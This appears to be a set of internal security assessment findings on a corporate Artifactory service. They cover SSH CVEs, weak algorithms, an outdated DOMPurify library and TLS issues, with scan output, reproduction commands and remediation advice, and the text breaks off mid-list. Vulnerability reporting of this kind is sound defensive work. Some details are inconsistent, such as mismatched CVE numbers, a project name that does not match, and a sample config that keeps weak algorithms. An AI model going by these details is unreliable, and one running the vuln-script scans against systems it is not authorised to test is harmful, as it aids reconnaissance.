**Vector:** `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`

### 2. CVSS String/Score:
**CVE-2020-15778**:  
CVSSv3 Score: **7.8 (High)**  
**Vector:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`

### 3. CVSS String/Score:
**CVE-2019-16905**:  
CVSSv3 Score: **7.8 (High)**  
**Vector:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

### 4. CVSS String/Score:
**CVE-2016-20012**:  
CVSSv3 Score: **5.3 (Medium)**  
**Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N`

### 5. CVSS String/Score:
**Insecure Authentication Methods**:  
CVSSv3 Score: **5.0 (Medium)**  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`

### 6. CVSS String/Score:
**Weak Encryption Algorithms**:  
CVSSv3 Score: **7.5 (High)**  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a security assessment of `Artifactory`, we observed the noted web app had several SSH vulnerabilities. Specifically, we identified the following:
1. **CVE-2016-20012**:  This issue allows an attacker to enumerate valid usernames through the SSH challenge-response mechanism. By observing subtle differences in server behavior, an attacker can determine whether a username exists on the system.
2. **CVE-2019-16905**:  This integer overflow vulnerability in **OpenSSH 8.0** can be exploited remotely by sending specially crafted data to the server during the SSH handshake process. This flaw could result in memory corruption, allowing attackers to execute arbitrary code before authentication.
3. **CVE-2020-15778**:  This command injection flaw in **OpenSSH 8.0** allows attackers to exploit argument parsing in certain scenarios, resulting in the execution of arbitrary commands remotely. No user interaction is required, and the vulnerability can be leveraged over a network.
4. **CVE-2021-41617**:  This is a privilege escalation vulnerability in **OpenSSH 8.0** where an authenticated local user could exploit the improper handling of supplemental groups to gain elevated privileges. The issue lies in how the process handles group permissions when executing commands, which can be manipulated for unauthorized access.
5. **Insecure Authentication Methods**: The server is configured to allow **password-based authentication**, which introduces a vulnerability to brute-force attacks and potential credential theft. The risk is moderate as password cracking could lead to unauthorized access to the server, but no direct execution of code or system compromise is possible unless the attacker successfully authenticates.
6. **Weak Encryption Algorithms**:  The system's current encryption setup includes some older or weaker encryption algorithms that may be vulnerable to cryptographic attacks. For example, some elliptic curve algorithms like **ecdh-sha2-nistp256** and **ecdh-sha2-nistp384** have been suspected of being backdoored by certain organizations, and other algorithms like **diffie-hellman-group-exchange-sha1** are vulnerable to key exchange attacks due to their reliance on outdated hash functions.
# Impact:
1. **CVE-2016-20012**:  An attacker can gain knowledge of valid usernames, which could assist in subsequent brute-force attacks or social engineering. However, no direct access or code execution is possible through this vulnerability.
2. **CVE-2019-16905**:  An attacker could exploit this vulnerability to execute arbitrary code or commands on the server before completing authentication. This could lead to a complete system compromise, including the ability to read, modify, and delete data on the system.
3. **CVE-2020-15778**:  A remote, unauthenticated attacker can inject and execute arbitrary commands on the vulnerable server. This could lead to complete system compromise, including unauthorized data access, alteration, or deletion, and allow attackers to execute arbitrary system commands.
4. **CVE-2021-41617**:  An attacker who has gained local access could use this flaw to execute commands with elevated privileges, allowing them to bypass normal user restrictions. This could lead to unauthorized data access, modification, or deletion, and potentially allow attackers to pivot to other systems.
5. **Insecure Authentication Methods**:  Allowing password-based authentication increases the likelihood of credential-based attacks. If an attacker is able to guess or crack a user’s password, they could gain unauthorized access to the server, leading to further escalation of privileges and potential lateral movement within the network.
6. **Weak Encryption Algorithms**:  An attacker could intercept and decrypt sensitive traffic, leading to the exposure of credentials, sensitive files, or other confidential information. The integrity of the communication could also be compromised, allowing an attacker to tamper with data in transit.

# Affected Assets:
## Affected Host(s):
- 10.50.227.144 (or1dra824.corp.adobe.com) [22/tcp]

# Evidence:
## ssh-audit
```
# general
(gen) banner: SSH-2.0-OpenSSH_8.0
(gen) software: OpenSSH 8.0
(gen) compatibility: OpenSSH 7.4+ (some functionality from 6.6), Dropbear SSH 2018.76+
(gen) compression: enabled (zlib@openssh.com)

# security
(cve) CVE-2021-41617                        -- (CVSSv2: 7.0) privilege escalation via supplemental groups
(cve) CVE-2020-15778                        -- (CVSSv2: 7.8) command injection via anomalous argument transfers
(cve) CVE-2019-16905                        -- (CVSSv2: 7.8) memory corruption and local code execution via pre-authentication integer overflow
(cve) CVE-2016-20012                        -- (CVSSv2: 5.3) enumerate usernames via challenge response

# key exchange algorithms
(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76
                                            `- [info] default key exchange since OpenSSH 6.4
(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.4, Dropbear SSH 2013.62
                                            `- [info] default key exchange since OpenSSH 6.4
(kex) ecdh-sha2-nistp256                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp384                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp521                    -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) diffie-hellman-group-exchange-sha256 (3072-bit) -- [info] available since OpenSSH 4.4
                                                      `- [info] OpenSSH's GEX fallback mechanism was triggered during testing. Very old SSH clients will still be able to create connections using a 2048-bit modulus, though modern clients will use 3072. This can only be disabled by recompiling the code (see https://github.com/openssh/openssh-portable/blob/V_9_4/dh.c#L477).
(kex) diffie-hellman-group14-sha256         -- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
                                            `- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3
(kex) diffie-hellman-group-exchange-sha1 (3072-bit) -- [fail] using broken SHA-1 hash algorithm
                                                    `- [info] available since OpenSSH 2.3.0
                                                    `- [info] OpenSSH's GEX fallback mechanism was triggered during testing. Very old SSH clients will still be able to create connections using a 2048-bit modulus, though modern clients will use 3072. This can only be disabled by recompiling the code (see https://github.com/openssh/openssh-portable/blob/V_9_4/dh.c#L477).
(kex) diffie-hellman-group14-sha1           -- [fail] using broken SHA-1 hash algorithm
                                            `- [warn] 2048-bit modulus only provides 112-bits of symmetric strength
                                            `- [info] available since OpenSSH 3.9, Dropbear SSH 0.53
(kex) kex-strict-s-v00@openssh.com          -- [info] pseudo-algorithm that denotes the peer supports a stricter key exchange method as a counter-measure to the Terrapin attack (CVE-2023-48795)

# host-key algorithms
(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) ssh-rsa (3072-bit)                    -- [fail] using broken SHA-1 hash algorithm
                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
                                            `- [info] deprecated in OpenSSH 8.8: https://www.openssh.com/txt/release-8.8
(key) ecdsa-sha2-nistp256                   -- [fail] using elliptic curves that are suspected as being backdoored by the U.S. National Security Agency
                                            `- [warn] using weak random number generator could reveal the key
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5

# encryption algorithms (ciphers)
(enc) aes256-gcm@openssh.com                -- [info] available since OpenSSH 6.2
(enc) chacha20-poly1305@openssh.com         -- [info] available since OpenSSH 6.5
                                            `- [info] default cipher since OpenSSH 6.9
(enc) aes256-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
(enc) aes256-cbc                            -- [warn] using weak cipher mode
                                            `- [info] available since OpenSSH 2.3.0, Dropbear SSH 0.47
(enc) aes128-gcm@openssh.com                -- [info] available since OpenSSH 6.2
(enc) aes128-ctr                            -- [info] available since OpenSSH 3.7, Dropbear SSH 0.52
(enc) aes128-cbc                            -- [warn] using weak cipher mode
                                            `- [info] available since OpenSSH 2.3.0, Dropbear SSH 0.28

# message authentication code algorithms
(mac) hmac-sha2-256-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha1-etm@openssh.com             -- [fail] using broken SHA-1 hash algorithm
                                            `- [info] available since OpenSSH 6.2
(mac) umac-128-etm@openssh.com              -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-512-etm@openssh.com         -- [info] available since OpenSSH 6.2
(mac) hmac-sha2-256                         -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56
(mac) hmac-sha1                             -- [fail] using broken SHA-1 hash algorithm
                                            `- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 2.1.0, Dropbear SSH 0.28
(mac) umac-128@openssh.com                  -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 6.2
(mac) hmac-sha2-512                         -- [warn] using encrypt-and-MAC mode
                                            `- [info] available since OpenSSH 5.9, Dropbear SSH 2013.56

# fingerprints
(fin) ssh-ed25519: SHA256:q3hM4LZnwrgJRI+V6nc7Hp0VfLpcboto0MYT93ocsX0
(fin) ssh-rsa: SHA256:yLqCDTZ7nOM1BJVsWj8g9FMcYydGh7bluP+iDgRWy4c

# algorithm recommendations (for OpenSSH 8.0)
(rec) +aes192-ctr                           -- enc algorithm to append 
(rec) -aes128-cbc                           -- enc algorithm to remove 
(rec) -aes256-cbc                           -- enc algorithm to remove 
(rec) -diffie-hellman-group-exchange-sha1   -- kex algorithm to remove 
(rec) -diffie-hellman-group14-sha1          -- kex algorithm to remove 
(rec) -diffie-hellman-group14-sha256        -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove 
(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove 
(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove 
(rec) -hmac-sha1                            -- mac algorithm to remove 
(rec) -hmac-sha1-etm@openssh.com            -- mac algorithm to remove 
(rec) -hmac-sha2-256                        -- mac algorithm to remove 
(rec) -hmac-sha2-512                        -- mac algorithm to remove 
(rec) -ssh-rsa                              -- key algorithm to remove 
(rec) -umac-128@openssh.com                 -- mac algorithm to remove 

# additional info
(nfo) For hardening guides on common OSes, please see: <https://www.ssh-audit.com/hardening_guides.html>
(nfo) Be aware that, while this target properly supports the strict key exchange method (via the kex-strict-?-v00@openssh.com marker) needed to protect against the Terrapin vulnerability (CVE-2023-48795), all peers must also support this feature as well, otherwise the vulnerability will still be present.  The following algorithms would allow an unpatched peer to create vulnerable SSH channels with this target: chacha20-poly1305@openssh.com, aes256-cbc, aes128-cbc, hmac-sha2-256-etm@openssh.com, hmac-sha1-etm@openssh.com, umac-128-etm@openssh.com, hmac-sha2-512-etm@openssh.com.  If any CBC ciphers are in this list, you may remove them while leaving the *-etm@openssh.com MACs in place; these MACs are fine while paired with non-CBC cipher types.
```

## nmap
```
# Nmap 7.95 scan initiated Wed Sep 18 18:22:51 2024 as: nmap -T4 --min-rate 500p --max-retries 3 --defeat-rst-ratelimit --script-timeout 10 -Pn -R --reason --resolve-all -sSV --open -p ssh --script=vulners,vuln,ssh* -oA nmap_ssh-2024.09.16-15.01.20 artifactory.corp.adobe.com
Nmap scan report for artifactory.corp.adobe.com (10.50.227.149)
Host is up, received user-set (0.089s latency).
rDNS record for 10.50.227.149: or1dra937.corp.adobe.com

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 54 OpenSSH 8.0 (protocol 2.0)
|_ssh-run: Failed to specify credentials and command to run.
| ssh2-enum-algos: 
|   kex_algorithms: (12)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group14-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group-exchange-sha1
|       diffie-hellman-group14-sha1
|       kex-strict-s-v00@openssh.com
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (7)
|       aes256-gcm@openssh.com
|       chacha20-poly1305@openssh.com
|       aes256-ctr
|       aes256-cbc
|       aes128-gcm@openssh.com
|       aes128-ctr
|       aes128-cbc
|   mac_algorithms: (8)
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha2-256
|       hmac-sha1
|       umac-128@openssh.com
|       hmac-sha2-512
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
| ssh-publickey-acceptance: 
|_  Accepted Public Keys: No public keys accepted
| ssh-hostkey: 
|   3072 36:96:5d:97:f1:27:43:1e:31:1d:b5:ba:aa:72:45:a0 (RSA)
|   256 91:0e:f0:cb:c0:a3:26:95:43:27:ad:85:54:65:01:8a (ECDSA)
|_  256 f8:21:12:54:d2:60:a7:49:51:57:ef:d1:7e:19:bd:9c (ED25519)
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     gssapi-keyex
|     gssapi-with-mic
|     password
|   Banner: |-----------------------------------------------------------------|
| | This system is for the use of authorized users only.            |
| | Individuals using this computer system without authority, or in |
| | excess of their authority, are subject to having all of their   |
| | activities on this system monitored and recorded by system      |
| | personnel.                                                      |
| |                                                                 |
| | In the course of monitoring individuals improperly using this   |
| | system, or in the course of system maintenance, the activities  |
| | of authorized users may also be monitored.                      |
| |                                                                 |
| | Anyone using this system expressly consents to such monitoring  |
| | and is advised that if such monitoring reveals possible         |
| | evidence of criminal activity, system personnel may provide the |
| | evidence of such monitoring to law enforcement officials.       |
|_|-----------------------------------------------------------------|

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 18 18:23:13 2024 -- 1 IP address (1 host up) scanned in 21.84 seconds
```

# Replicate Finding:
1. Run the following command: `ssh-audit -n -p 22 artifactory.corp.adobe.com`
2. Then run the following: `sudo nmap -T4 --min-rate 500p --max-retries 3 --defeat-rst-ratelimit --script-timeout 10 -Pn -R --reason --resolve-all -sSV --open -p ssh --script="vulners,vuln,ssh*" -oA nmap_ssh-$current_time artifactory.corp.adobe.com`
3. Review the output

# Mitigation/Remediation:
We recommend the following:
1. **Upgrade OpenSSH**: Update OpenSSH to a version that addresses this issue (OpenSSH 8.1 or later).
2. **Restrict Local Access**: Ensure that only trusted users have local access to the server, reducing the risk of exploitation.
3. **Use Mandatory Access Control (MAC)**: Implement MAC policies such as SELinux or AppArmor to further restrict user privileges.
4. **Harden SSH Configuration**: Restrict SSH access to only trusted IP addresses and disable command forwarding features.
5. **Review Input Handling**: Apply patches and validate inputs properly when arguments are passed in an SSH context to prevent injections.
6. **Implement Strong Access Control**: Ensure SSH access is restricted to only trusted IP addresses and networks to reduce exposure.
7. **Enable Additional Security Mechanisms**: Use features like SSH key-based authentication and disable password-based logins to reduce the risk of pre-authentication exploits.
8. **Limit Login Attempts**: Implement rate limiting or account lockouts after a certain number of failed login attempts to reduce the chance of brute-force attacks.
9. **Disable Challenge-Response Authentication**: Remove challenge-response authentication from the SSH configuration to mitigate the enumeration.
10. **Use Strong Password Policies**: If password authentication cannot be disabled, enforce strong password complexity requirements and limit login attempts to mitigate brute-force risks.
11. 1. **Disable Weak Algorithms**: Ensure the server is configured to use the latest, secure encryption algorithms by editing the SSH configuration file (`/etc/ssh/sshd_config`). Remove or disable deprecated or weaker algorithms, especially those relying on SHA-1 and older elliptic curve groups.
12. **Test and Verify Configuration**: After updating the SSH configuration, use tools like `ssh-audit` to verify the server is using only strong encryption algorithms.

Below is a sample config file the team could use to help mitigate the issue:
```bash
# Enforce SELinux policies on SSH
setsebool -P ssh_sysadm_login 0

# Disable command forwarding in SSH configuration
AllowTcpForwarding no
PermitTunnel no

# Allow only specific IP ranges to access SSH
AllowUsers *@192.168.1.*

# Disable challenge-response authentication
ChallengeResponseAuthentication no

# Disable password authentication in the SSH configuration
PasswordAuthentication no

# Enable public key authentication
PubkeyAuthentication yes

# Ensure GSSAPI authentication is allowed for Kerberos-based setups
GSSAPIAuthentication yes

# Key Exchange Algorithms
KexAlgorithms curve25519-sha256, diffie-hellman-group-exchange-sha256

# Host Key Algorithms
HostKeyAlgorithms ecdsa-sha2-nistp256, rsa-sha2-512, rsa-sha2-256, ssh-ed25519

# Ciphers (Symmetric Encryption)
Ciphers aes256-gcm@openssh.com, aes128-gcm@openssh.com, chacha20-poly1305@openssh.com

# MAC Algorithms (Message Authentication Codes)
MACs hmac-sha2-256, hmac-sha2-512, umac-128@openssh.com
```

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf
3. [https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
4. [https://cwe.mitre.org/data/definitions/190.html](https://cwe.mitre.org/data/definitions/190.html)  
5. [https://cwe.mitre.org/data/definitions/203.html](https://cwe.mitre.org/data/definitions/203.html)  
6. [https://cwe.mitre.org/data/definitions/269.html](https://cwe.mitre.org/data/definitions/269.html)  
7. [https://cwe.mitre.org/data/definitions/521.html](https://cwe.mitre.org/data/definitions/521.html)  
8. [https://cwe.mitre.org/data/definitions/78.html](https://cwe.mitre.org/data/definitions/78.html)  
9. [https://www.openssh.com/security.html](https://www.openssh.com/security.html)
10. https://cwe.mitre.org/data/definitions/327.html](https://cwe.mitre.org/data/definitions/327.html)
11. [https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
12. [https://wiki.mozilla.org/Security/Server_Side_TLS](https://wiki.mozilla.org/Security/Server_Side_TLS)



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Outdated Vulnerable Software - DOMPurify - Medium (6.1).md
---

# Risk: Medium (6.1)
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**Base Score: 6.1 (Medium)**

**Explanation:** The vulnerability has a network attack vector (AV:N), low attack complexity (AC:L), no privileges required (PR:N), and requires user interaction (UI:R). The scope is changed (S:C), meaning the impact extends beyond the vulnerable component. The confidentiality and integrity impacts are low (C:L, I:L), while availability is not impacted (A:N).

Based on the risk, the SLA to fix the ticket is **90** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Executive Summary
A security review of JFrog Artifactory revealed that it is using an outdated version of DOMPurify (2.3.8), which contains known vulnerabilities. DOMPurify is a library used to sanitize HTML, MathML, and SVG to prevent cross-site scripting (XSS) attacks. The identified vulnerability could allow attackers to inject malicious scripts, potentially leading to data theft or unauthorized actions within the Artifactory instance. Immediate action is required to update DOMPurify to a secure version to mitigate this risk.

## Detailed Finding
While conducting a security review of `Artifactory Access`, we observed the noted web application used outdated 3P software with known vulnerabilities. Specifically, the noted application used DOMPurify v2.3.8, which is vulnerable to XSS attacks due to improper sanitization of deeply nested elements. This vulnerability (CVE-2024-47875) allows attackers to inject malicious payloads that can bypass the sanitization process. This issue is particularly concerning for JFrog Artifactory, a universal repository manager used in DevOps workflows, as it manages and distributes software artifacts, binaries, and packages. 

## Impact:
If an attacker leverages this vulnerability, they could inject malicious scripts into the Artifactory instance. Given Artifactory's role in managing and distributing software artifacts, an attacker could potentially manipulate or steal sensitive data, disrupt CI/CD pipelines, or distribute compromised artifacts. This could lead to significant operational disruptions, data breaches, and loss of trust in the integrity of the software supply chain.

# Affected Assets:
## Affected Software:
- DOMPurify@2.3.8

## Affected Host(s):
- https://artifactory.corp.adobe.com/ui/api/v1/ui/webapp/js/manifest.umd.js?v=
- https://artifactory.corp.adobe.com/ui/externals/jfrog-ui-essentials/dist/jfrog-ui-essentials.umd.min.js
- https://artifactory.corp.adobe.com/ui/js/chunk-vendors.175759a1.js

# Evidence:
```javascript
c0988:function(e,t,n){e.exports=n("d4af")},c0c4:function(e,t,n){
/*! @license DOMPurify 2.3.8 | (c) Cure53 and other contributors | Released under the Apache license 2.0 and Mozilla Public License 2.0 | github.com/cure53/DOMPurify/blob/2.3.8/LICENSE */
(function(t,n){e.exports=n()}
```

# Replicate Finding:
1. Go to the impacted URL in your browser: `https://artifactory.corp.adobe.com/ui/api/v1/ui/webapp/js/manifest.umd.js?v=`
2. Search for `DOMPurify 2.3.8`

# Mitigation/Remediation:
We recommend updating DOMPurify to the latest version (which is `v3.2.4` at the time of writing), where the issue has been addressed. The following steps can be taken:

1. **Update DOMPurify:** Upgrade to the latest version of DOMPurify (2.5.0 or higher).

```bash
   npm install dompurify@latest
```

1. **Regular Security Audits:** Conduct regular reviews of third-party libraries and dependencies to ensure they are up-to-date with the latest security patches.
2. **Implement Security Best Practices:** Ensure input validation, sanitization, and output encoding are consistently applied throughout the application.

For more details, please the references below!

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Source_Code_Security_Standard.pdf
3. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Secure-Product-Lifecycle-Standard.pdf
4. [https://github.com/advisories/GHSA-p3vf-v8qc-cwcr](https://github.com/advisories/GHSA-p3vf-v8qc-cwcr)
5. [https://github.com/cure53/DOMPurify/security/advisories/GHSA-p3vf-v8qc-cwcr](https://github.com/cure53/DOMPurify/security/advisories/GHSA-p3vf-v8qc-cwcr)
6. [https://nvd.nist.gov/vuln/detail/CVE-2024-48910](https://nvd.nist.gov/vuln/detail/CVE-2024-48910)
7. [https://github.com/cure53/DOMPurify/commit/d1dd0374caef2b4c56c3bd09fe1988c3479166dc](https://github.com/cure53/DOMPurify/commit/d1dd0374caef2b4c56c3bd09fe1988c3479166dc)
8. [https://github.com/cure53/DOMPurify](https://github.com/cure53/DOMPurify)
9. [DOMPurify Vulnerabilities - Snyk](https://security.snyk.io/package/npm/dompurify)
10. [CVE-2024-47875 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-47875)
11. [Understanding the Critical Flaw in DOMPurify](https://linuxpatch.com/cve/CVE-2024-47875)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Inadequate Encryption Strength - TLS-SSL Security Misconfiguration & Weak Ciphers  - High (7.5).md
---

# Risk: High (7.5) 
**CVSS Vector CVSS:3.1`/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`

1. **BEAST**  
**CVSSv3 Base Score**: 4.0 (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: BEAST exploits a flaw in TLS 1.0. The high complexity and modern mitigations in browsers lower the overall severity.

2. **BEAST_CBC_TLS1**  
**CVSSv3 Base Score**: 4.0 (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: This attack is specific to TLS 1.0 with CBC-mode encryption, requiring high effort to exploit.

3. **BREACH**  
**CVSSv3 Base Score**: 5.9 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)  
**Explanation**: Easier to exploit due to compression vulnerabilities but requires user interaction.

4. **cert_chain_of_trust**  
**CVSSv3 Base Score**: 7.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Explanation**: The lack of a valid certificate chain makes this a critical vulnerability, as it weakens the security of all SSL/TLS communications.

5. **cert_expirationStatus**  
**CVSSv3 Base Score**: 7.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Explanation**: Expired certificates invalidate encryption, making communications susceptible to MitM attacks.

6. **cert_notAfter**  
**CVSSv3 Base Score**: 7.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Explanation**: Expired certificates compromise confidentiality and integrity due to lack of trust.

7. **cert_revocation**  
**CVSSv3 Base Score**: 6.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Explanation**: Failing to check for certificate revocation opens the server to attacks using compromised certificates.

8. **cert_subjectAltName**  
**CVSSv3 Base Score**: 6.0 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: Misconfigured or missing SAN values can lead to MITM attacks.

9. **cert_trust**  
**CVSSv3 Base Score**: 7.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Explanation**: A certificate that isn’t trusted opens the door to impersonation and data interception.

10. **cipherlist_3DES_IDEA**  
**CVSSv3 Base Score**: 6.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: 3DES and IDEA ciphers are considered weak due to their susceptibility to birthday attacks.

11. **cipherlist_AVERAGE**  
**CVSSv3 Base Score**: 5.0 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: The use of average-strength ciphers may not offer the necessary protection against modern attacks.

12. **cipher_order**  
**CVSSv3 Base Score**: 4.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: Poor cipher suite ordering can lead to weaker ciphers being chosen, impacting confidentiality.

13. **DNS_CAArecord**  
**CVSSv3 Base Score**: 3.7 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)  
**Explanation**: Missing CAA records allows attackers to potentially obtain unauthorized certificates for a domain.

14. **HSTS**  
**CVSSv3 Base Score**: 6.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Explanation**: Missing HSTS headers expose the server to potential SSL stripping attacks.

15. **LUCKY13**  
**CVSSv3 Base Score**: 5.9 (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**Explanation**: LUCKY13 exploits a timing side-channel attack, but it requires high effort and precision to exploit.

16. **OCSP_stapling**  
**CVSSv3 Base Score**: 5.0 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: Not enabling OCSP stapling can result in slower revocation checks, and users may unknowingly use invalid certificates.

17. **security_headers**  
**CVSSv3 Base Score**: 6.0 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: Missing security headers can expose the application to cross-site scripting (XSS), clickjacking, and other attacks.

18. **SWEET32**  
**CVSSv3 Base Score**: 5.9 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)  
**Explanation**: SWEET32 attacks exploit 64-bit block ciphers and pose a threat to confidentiality.

19. **TLS1**  
**CVSSv3 Base Score**: 6.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Explanation**: TLS 1.0 is outdated and vulnerable to multiple known attacks like BEAST and LUCKY13.

20. **TLS1_1**  
**CVSSv3 Base Score**: 6.5 (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)  
**Explanation**: TLS 1.1 has similar vulnerabilities to TLS 1.0, making it an outdated protocol.
   
Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While performing a security code review of `Project Neo`, we observed the noted web application had several TLS/SSL related issues. Specifically, the noted web application was susceptible to the following issues:
1. **BEAST**: This vulnerability targets the TLS 1.0 protocol using a chosen-plaintext attack to break the encryption in CBC-mode ciphers.
2. **BEAST_CBC_TLS1**: A variation of BEAST that specifically targets CBC-mode ciphers in TLS 1.0.
3. **BREACH**: Compression attacks (e.g., gzip) leak sensitive data from encrypted HTTPS responses.
4. **cert_chain_of_trust**: Lack of a valid certificate chain undermines trust, allowing attackers to impersonate the server.
5. **cert_expirationStatus**: Expired certificates cause SSL/TLS connections to be untrusted.
6. **cert_notAfter**: When certificates are past their valid dates, encrypted communications are no longer trusted.
7. **cert_revocation**: Not checking the revocation status of certificates allows attackers to use compromised certificates.
8. **cert_subjectAltName**: Missing or incorrectly configured SAN values may result in certificates not being valid for certain domain names.
9. **cert_trust**: Untrusted certificates allow attackers to intercept and alter communications.
10. **cipherlist_3DES_IDEA**: Use of weak ciphers like 3DES and IDEA allows attacks like SWEET32, which can decrypt session data.
11. **cipherlist_AVERAGE**: Using weak or non-optimal ciphers can degrade the encryption's effectiveness, making attacks easier.
